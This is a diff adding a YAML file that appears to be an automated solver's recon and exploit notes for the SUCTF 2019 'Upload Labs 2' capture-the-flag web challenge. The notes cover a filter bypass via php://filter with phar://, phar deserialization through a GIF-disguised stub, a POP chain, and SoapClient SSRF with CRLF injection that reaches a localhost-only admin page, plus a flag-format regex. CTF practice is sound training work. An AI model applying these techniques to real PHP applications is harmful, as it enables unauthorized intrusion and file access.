@@ -1,0 +1,132 @@
+name: '[SUCTF 2019]Upload Labs 2'
+category: web
+keywords:
+- suctf
+- upload
+- labs
+- github
+- team
+- tree
+- master
+- web
+- admin
+- php
+- include
+- config
+steps:
+- 'Live box is a REBUILT instance of SUCTF2019 UploadLabs2: /robots.txt and /static/secretkey.txt
+  are now 404 (old recon facts stale).'
+- 'func.php accepts POST submit+url and echoes <p>Your file type is ''MIME''</p> for
+  arbitrary local paths => unauthenticated MIME/filesystem oracle. Confirmed readable
+  path signatures: /etc/passwd=text/plain, /readflag.c=text/x-c, /var/www/html/admin.php=text/x-php,
+  /var/www/html/class.php=text/x-php, /var/www/html/index.php=text/html, /readflag=application/x-executable,
+  /var/www/html/upload=directory. /flag is chmod 600 => finfo silent (unreadable).'
+- 'func.php filter blocks url starting with phar/ftp/zlib/data/glob/ssh2/... AND any
+  url containing ''file'',''data'',''..''. Bypass that is NOT blocked: url=php://filter/resource=phar://./upload/<dir>/<file>.gif
+  (contains ''filter'' not ''file''; ''phar'' not at pos 0). Confirmed: php://filter/resource=/etc/passwd
+  returns text/plain, http://127.0.0.1/... returns silent (allow_url_fopen/http wrapper
+  disabled).'
+- index.php upload dir = upload/md5($_SERVER['REMOTE_ADDR']), filename = md5(client
+  filename)+ext. Our own dir (worker behind proxy) = upload/cbf47d2c276c4ee1a7c757e6faad8d1a,
+  e.g. /upload/cbf47d2c276c4ee1a7c757e6faad8d1a/1c9f597d4ff22e97b45449ba90261ecf.gif
+  (upload of 'reconprobe.gif'). Upload dirs are world-listable (Apache Indexes on
+  /upload/) and 0777 writable.
+- /upload/.htaccess exists and returns 403 (deny rules for upload dir). Apache 2.4.18
+  Ubuntu confirmed via 404 body; front proxy is openresty; TRACE=405, /server-status=403.
+- 'PHAR DESERIALIZATION CONFIRMED WORKING on live box. Upload a phar renamed .gif
+  (stub ''GIF89a<script language="php">__HALT_COMPILER();</script>'', metadata=File
+  class, no ''<?'' bytes so index.php Check passes), then POST func.php url=php://filter/resource=phar://./upload/<dir>/<md5>.gif
+  -> response gains ''&lt;? in contents!'' (826 bytes vs 808 baseline) proving File::__wakeup
+  + Check::check executed. Payload+generator: shared/recon/mk2.php, shared/recon/payload.gif;
+  uploaded at upload/cbf47d2c276c4ee1a7c757e6faad8d1a/0b2e3a89cebfe0600f950a1e9ab3588c.gif.
+  NOTE url=phar://... at pos 0 is blocked (Go away), the php://filter prefix both
+  bypasses the filter and triggers phar.'
+- 'Proxy in front of this box rotates egress to MULTIPLE backend IPs: our uploads
+  landed in 4 distinct upload/md5(REMOTE_ADDR) dirs (cbf47d2c276c4ee1a7c757e6faad8d1a,
+  8bd07003ebdc19616f84e1f290e93bd9, 7b60fe8e611ddeb5507d9241b85e8070) while Apache
+  is one shared filesystem (all dirs listable & files fetchable 200 regardless of
+  dir). Do NOT assume one stable REMOTE_ADDR hash; also the box was pre-seeded with
+  8bd0... dir.'
+- 'PHAR POP-CHAIN CONTROL PROVEN on live box: payload whose File::func=''Check'' and
+  file_name=array(''/var/www/html/index.php'') triggers ''&lt;\? in contents!'' via
+  php://filter/resource=phar://..., while the same payload with file_name=array(''/etc/passwd'')
+  stays silent (808B) - i.e. the reflected Check class really receives our ARRAY arg
+  and file_get_contents really runs. Generator: shared/recon/mk2.php + shared/recon/mkclass.php.'
+- 'allow_url_fopen is OFF on the target: func.php with url=http://127.0.0.1/index.php
+  and url=php://filter/resource=http://127.0.0.1/index.php both return the bare 808B
+  page (no file type line), while target->internet egress WORKS (SoapClient to our
+  public NAT IP held 2493ms before failing). So http/https wrapper read is impossible;
+  SoapClient (raw socket) is the only outbound primitive.'
+- 'index.php upload validation confirmed live: rejects size>=204800 and rejects .php
+  ext even with image/gif Content-Type (both ''非法的文件格式''); accepts gif/jpeg/png with
+  matching type and no ''<?'' bytes. Check class = mb_strpos(file,''<?'') die. /upload/.htaccess
+  present (403) so PHP is not executed from upload dir.'
+- 'Target can reach the public internet but our container has NO inbound mapping (curl
+  to our own 152.175.124.116:9099 self=000). Outbound-only: any nc-catcher / rogue-MySQL-server
+  must live on a host with an OPEN inbound port.'
+- 'SOLVED THE TRANSPORT: SoapClient phar metadata CAN POST to localhost with REMOTE_ADDR=127.0.0.1.
+  Proof: phar whose File::func=''SoapClient'' and file_name=array(null,array(''location''=>''http://127.0.0.1/index.php'',''uri''=>''aaab'',''user_agent''=>CRLF-injected
+  multipart body)) -- triggering via func.php made the server upload a file from ITSELF;
+  /upload/f528764d624db129b32c21fbca0cb8d6/ (= md5(''127.0.0.1'')) now contains 7acf8c18d544da8a3f407e83181f4670.gif
+  (= md5(''soapup.gif''), our injected filename), fetchable 200. Generator: shared/recon/mkmp.php.
+  So the admin.php 127.0.0.1 gate is passable from func.php.'
+evidence_chain:
+- 'Live box is a REBUILT instance of SUCTF2019 UploadLabs2: /robots.txt and /static/secretkey.txt
+  are now 404 (old recon facts stale).'
+- 'func.php accepts POST submit+url and echoes <p>Your file type is ''MIME''</p> for
+  arbitrary local paths => unauthenticated MIME/filesystem oracle. Confirmed readable
+  path signatures: /etc/passwd=text/plain, /readflag.c=text/x-c, /var/www/html/admin.php=text/x-php,
+  /var/www/html/class.php=text/x-php, /var/www/html/index.php=text/html, /readflag=application/x-executable,
+  /var/www/html/upload=directory. /flag is chmod 600 => finfo silent (unreadable).'
+- 'func.php filter blocks url starting with phar/ftp/zlib/data/glob/ssh2/... AND any
+  url containing ''file'',''data'',''..''. Bypass that is NOT blocked: url=php://filter/resource=phar://./upload/<dir>/<file>.gif
+  (contains ''filter'' not ''file''; ''phar'' not at pos 0). Confirmed: php://filter/resource=/etc/passwd
+  returns text/plain, http://127.0.0.1/... returns silent (allow_url_fopen/http wrapper
+  disabled).'
+- index.php upload dir = upload/md5($_SERVER['REMOTE_ADDR']), filename = md5(client
+  filename)+ext. Our own dir (worker behind proxy) = upload/cbf47d2c276c4ee1a7c757e6faad8d1a,
+  e.g. /upload/cbf47d2c276c4ee1a7c757e6faad8d1a/1c9f597d4ff22e97b45449ba90261ecf.gif
+  (upload of 'reconprobe.gif'). Upload dirs are world-listable (Apache Indexes on
+  /upload/) and 0777 writable.
+- /upload/.htaccess exists and returns 403 (deny rules for upload dir). Apache 2.4.18
+  Ubuntu confirmed via 404 body; front proxy is openresty; TRACE=405, /server-status=403.
+- 'PHAR DESERIALIZATION CONFIRMED WORKING on live box. Upload a phar renamed .gif
+  (stub ''GIF89a<script language="php">__HALT_COMPILER();</script>'', metadata=File
+  class, no ''<?'' bytes so index.php Check passes), then POST func.php url=php://filter/resource=phar://./upload/<dir>/<md5>.gif
+  -> response gains ''&lt;? in contents!'' (826 bytes vs 808 baseline) proving File::__wakeup
+  + Check::check executed. Payload+generator: shared/recon/mk2.php, shared/recon/payload.gif;
+  uploaded at upload/cbf47d2c276c4ee1a7c757e6faad8d1a/0b2e3a89cebfe0600f950a1e9ab3588c.gif.
+  NOTE url=phar://... at pos 0 is blocked (Go away), the php://filter prefix both
+  bypasses the filter and triggers phar.'
+- 'Proxy in front of this box rotates egress to MULTIPLE backend IPs: our uploads
+  landed in 4 distinct upload/md5(REMOTE_ADDR) dirs (cbf47d2c276c4ee1a7c757e6faad8d1a,
+  8bd07003ebdc19616f84e1f290e93bd9, 7b60fe8e611ddeb5507d9241b85e8070) while Apache
+  is one shared filesystem (all dirs listable & files fetchable 200 regardless of
+  dir). Do NOT assume one stable REMOTE_ADDR hash; also the box was pre-seeded with
+  8bd0... dir.'
+- 'PHAR POP-CHAIN CONTROL PROVEN on live box: payload whose File::func=''Check'' and
+  file_name=array(''/var/www/html/index.php'') triggers ''&lt;\? in contents!'' via
+  php://filter/resource=phar://..., while the same payload with file_name=array(''/etc/passwd'')
+  stays silent (808B) - i.e. the reflected Check class really receives our ARRAY arg
+  and file_get_contents really runs. Generator: shared/recon/mk2.php + shared/recon/mkclass.php.'
+- 'allow_url_fopen is OFF on the target: func.php with url=http://127.0.0.1/index.php
+  and url=php://filter/resource=http://127.0.0.1/index.php both return the bare 808B
+  page (no file type line), while target->internet egress WORKS (SoapClient to our
+  public NAT IP held 2493ms before failing). So http/https wrapper read is impossible;
+  SoapClient (raw socket) is the only outbound primitive.'
+- 'index.php upload validation confirmed live: rejects size>=204800 and rejects .php
+  ext even with image/gif Content-Type (both ''非法的文件格式''); accepts gif/jpeg/png with
+  matching type and no ''<?'' bytes. Check class = mb_strpos(file,''<?'') die. /upload/.htaccess
+  present (403) so PHP is not executed from upload dir.'
+- 'Target can reach the public internet but our container has NO inbound mapping (curl
+  to our own 152.175.124.116:9099 self=000). Outbound-only: any nc-catcher / rogue-MySQL-server
+  must live on a host with an OPEN inbound port.'
+- 'SOLVED THE TRANSPORT: SoapClient phar metadata CAN POST to localhost with REMOTE_ADDR=127.0.0.1.
+  Proof: phar whose File::func=''SoapClient'' and file_name=array(null,array(''location''=>''http://127.0.0.1/index.php'',''uri''=>''aaab'',''user_agent''=>CRLF-injected
+  multipart body)) -- triggering via func.php made the server upload a file from ITSELF;
+  /upload/f528764d624db129b32c21fbca0cb8d6/ (= md5(''127.0.0.1'')) now contains 7acf8c18d544da8a3f407e83181f4670.gif
+  (= md5(''soapup.gif''), our injected filename), fetchable 200. Generator: shared/recon/mkmp.php.
+  So the admin.php 127.0.0.1 gate is passable from func.php.'
+success_format: CTF2\{[^}]+\}
+source: 45040cb3-4071-4990-8579-2bf0e4f86f05 (solver 08e343c0-8415-4124-ba9b-af3393bdbf47)
+notes: ''
